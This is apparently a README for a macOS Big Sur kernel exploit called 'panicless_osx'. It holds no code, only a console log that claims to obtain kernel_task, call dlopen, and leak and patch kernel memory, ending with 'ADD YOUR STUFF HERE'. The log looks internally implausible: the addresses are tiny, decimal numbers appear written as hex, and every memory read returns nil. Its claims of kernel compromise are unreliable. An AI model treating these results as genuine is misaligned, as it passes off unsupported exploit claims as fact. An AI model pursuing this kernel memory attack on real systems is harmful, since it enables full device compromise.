# panicless_osx
an arbitrary mem emulation exploit for macOS (Big Sur)

[panicless_osx] lets move in the dangly sketchy exploit
[panicless_osx] getting kernel task.
[panicless_osx] writing argument to dlopen.
[+] done!
[panicless_osx] exploring fake kernel_task abilities
[exploit] kernel_task (os/kern) successful
[+] kernel_task -> 0x1048835
[+] (read/kern) orig where:0x1056768 -> val 16
[+] (read/kern) patched where:0x1056768 -> val -272633096
[+] (read/kern) orig where:0x8192 -> val -272633088
[+] (read/kern) patched where:0x8192 -> val -272633096
[+] (read/kern) READ/MEMORY LEAK 
where 0x4919 ->
info: nil
[+] (read/kern) READ/MEMORY LEAK 
where 0x9015 ->
info: nil
[panicless_osx] fun part here (lets have some fun?)
[+] (read/kern) READ/MEMORY LEAK 
where 0x16777504 ->
info: nil
info -> 8
[+] (read/kern) READ/MEMORY LEAK 
where 0x16778272 ->
info: nil
info -> 16
[+] (read/kern) READ/MEMORY LEAK 
where 0x16777504 ->
info: nil
info -> 16
[+] (read/kern) READ/MEMORY LEAK 
where 0x13443 ->
info: nil
info -> 16
[+] (read/kern) orig where:0x13443 -> val 16
[+] (read/kern) patched where:0x13443 -> val -272633096
[+] (read/kern) READ/MEMORY LEAK 
where 0x13443 ->
info: nil
info -> 16
[+] (read/kern) READ/MEMORY LEAK 
where 0x13443 ->
info: nil
[*] wefun -> 0x16
[*] wefun_pac -> 0x16777215
[+] (read/kern) READ/MEMORY LEAK 
where 0x16777231 ->
info: nil
wefun_pac_orig -> 16
[+] (read/kern) orig where:0x16777231 -> val 16
[+] (read/kern) patched where:0x16777231 -> val -272633096
[+] (read/kern) READ/MEMORY LEAK 
where 0x16777231 ->
info: nil
wefun_pac_patched -> 16
[panicless_osx] ADD YOUR STUFF HERE
Program ended with exit code: 0
